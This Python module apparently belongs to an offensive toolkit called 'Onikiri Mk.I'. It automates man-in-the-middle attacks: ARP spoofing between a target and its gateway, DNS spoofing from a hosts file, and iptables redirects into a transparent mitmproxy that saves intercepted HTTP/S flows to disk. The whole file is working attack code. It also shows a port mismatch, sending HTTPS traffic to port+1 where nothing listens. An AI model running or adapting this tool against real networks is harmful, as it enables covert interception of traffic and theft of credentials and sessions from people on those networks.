"""
Onikiri Mk.I — MITM Module
ARP spoofing, DNS spoofing, and transparent HTTP/S proxy.

External dependencies: arpspoof (dsniff), dnsspoof, mitmproxy (optional)
Kernel requirements: ip_forward=1, iptables/nftables NAT
"""

from __future__ import annotations

import asyncio
from pathlib import Path
from typing import Any

from .base_module import BaseModule, ModuleState


class MitmModule(BaseModule):
    name = "mitm"
    description = "MITM: ARP spoof, DNS spoof, HTTP/S transparent proxy"
    commands = {
        "arp_spoof_start":  "Start ARP spoofing between target and gateway",
        "arp_spoof_stop":   "Stop ARP spoofing and restore ARP tables",
        "dns_spoof_start":  "Start DNS spoofing (redirect queries to local host)",
        "dns_spoof_stop":   "Stop DNS spoofing",
        "proxy_start":      "Start transparent mitmproxy on port 8080",
        "proxy_stop":       "Stop mitmproxy",
        "enable_forward":   "Enable kernel IP forwarding",
        "disable_forward":  "Disable kernel IP forwarding",
        "status":           "Return MITM subsystem status",
    }

    _IP_FORWARD = Path("/proc/sys/net/ipv4/ip_forward")

    def __init__(self) -> None:
        super().__init__()
        self._arp_procs: list[asyncio.subprocess.Process] = []
        self._dns_proc: asyncio.subprocess.Process | None = None
        self._proxy_proc: asyncio.subprocess.Process | None = None

    async def register(self) -> None:
        self.state = ModuleState.IDLE

    async def execute(self, command: str, params: dict) -> Any:
        handlers = {
            "arp_spoof_start":  self._arp_start,
            "arp_spoof_stop":   self._arp_stop,
            "dns_spoof_start":  self._dns_start,
            "dns_spoof_stop":   self._dns_stop,
            "proxy_start":      self._proxy_start,
            "proxy_stop":       self._proxy_stop,
            "enable_forward":   self._enable_forward,
            "disable_forward":  self._disable_forward,
            "status":           self._status,
        }
        handler = handlers.get(command)
        if handler is None:
            raise ValueError(f"unknown command: {command}")
        return await handler(params)

    # ── ARP Spoofing ──────────────────────────────────────────────────────────

    async def _arp_start(self, params: dict) -> dict:
        self._require(params, "interface", "target", "gateway")
        iface   = self._sanitise_iface(params["interface"])
        target  = self._sanitise_ip(params["target"])
        gateway = self._sanitise_ip(params["gateway"])

        await self._enable_forward({})

        # Two arpspoof processes: target←→gateway
        p1 = await asyncio.create_subprocess_exec(
            "arpspoof", "-i", iface, "-t", target, gateway,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        p2 = await asyncio.create_subprocess_exec(
            "arpspoof", "-i", iface, "-t", gateway, target,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        self._arp_procs = [p1, p2]
        self.state = ModuleState.RUNNING
        return {"target": target, "gateway": gateway, "pids": [p1.pid, p2.pid]}

    async def _arp_stop(self, _params: dict) -> dict:
        pids = []
        for p in self._arp_procs:
            if p.returncode is None:
                p.terminate()
                pids.append(p.pid)
        for p in self._arp_procs:
            try:
                await asyncio.wait_for(p.wait(), timeout=3.0)
            except asyncio.TimeoutError:
                p.kill()
        self._arp_procs.clear()
        self.state = ModuleState.IDLE
        return {"stopped_pids": pids}

    # ── DNS Spoofing ──────────────────────────────────────────────────────────

    async def _dns_start(self, params: dict) -> dict:
        self._require(params, "interface", "hosts_file")
        iface = self._sanitise_iface(params["interface"])
        hosts = Path(params["hosts_file"]).resolve()
        if not hosts.exists():
            raise FileNotFoundError(f"hosts file not found: {hosts}")

        self._dns_proc = await asyncio.create_subprocess_exec(
            "dnsspoof", "-i", iface, "-f", str(hosts),
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        return {"pid": self._dns_proc.pid}

    async def _dns_stop(self, _params: dict) -> dict:
        if self._dns_proc and self._dns_proc.returncode is None:
            pid = self._dns_proc.pid
            self._dns_proc.terminate()
            await self._dns_proc.wait()
            self._dns_proc = None
            return {"stopped_pid": pid}
        return {"stopped_pid": None}

    # ── HTTP/S Proxy ──────────────────────────────────────────────────────────

    async def _proxy_start(self, params: dict) -> dict:
        port = int(params.get("port", 8080))
        if not (1024 <= port <= 65535):
            raise ValueError(f"invalid port: {port}")

        # Set up iptables REDIRECT for transparent proxy
        await self._run_subprocess(
            ["iptables", "-t", "nat", "-A", "PREROUTING",
             "-p", "tcp", "--dport", "80",
             "-j", "REDIRECT", "--to-port", str(port)]
        )
        await self._run_subprocess(
            ["iptables", "-t", "nat", "-A", "PREROUTING",
             "-p", "tcp", "--dport", "443",
             "-j", "REDIRECT", "--to-port", str(port + 1)]
        )

        self._proxy_proc = await asyncio.create_subprocess_exec(
            "mitmdump", "--mode", "transparent",
            "--listen-port", str(port),
            "--save-stream-file", "/userdata/captures/mitm_capture.flows",
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        return {"pid": self._proxy_proc.pid, "port": port}

    async def _proxy_stop(self, _params: dict) -> dict:
        # Flush iptables NAT rules added by proxy_start
        await self._run_subprocess(
            ["iptables", "-t", "nat", "-F", "PREROUTING"]
        )
        if self._proxy_proc and self._proxy_proc.returncode is None:
            pid = self._proxy_proc.pid
            self._proxy_proc.terminate()
            await self._proxy_proc.wait()
            self._proxy_proc = None
            return {"stopped_pid": pid}
        return {"stopped_pid": None}

    # ── IP Forward ────────────────────────────────────────────────────────────

    async def _enable_forward(self, _params: dict) -> dict:
        self._IP_FORWARD.write_text("1\n")
        return {"ip_forward": 1}

    async def _disable_forward(self, _params: dict) -> dict:
        self._IP_FORWARD.write_text("0\n")
        return {"ip_forward": 0}

    # ── Status ────────────────────────────────────────────────────────────────

    async def _status(self, _params: dict) -> dict:
        fwd = self._IP_FORWARD.read_text().strip() == "1"
        return {
            "ip_forward": fwd,
            "arp_spoof_active": bool(self._arp_procs),
            "dns_spoof_active": self._dns_proc is not None,
            "proxy_active": self._proxy_proc is not None,
        }

    # ── Input validation ──────────────────────────────────────────────────────

    @staticmethod
    def _sanitise_ip(ip: str) -> str:
        import ipaddress
        try:
            return str(ipaddress.ip_address(ip.strip()))
        except ValueError:
            raise ValueError(f"invalid IP address: {ip!r}")
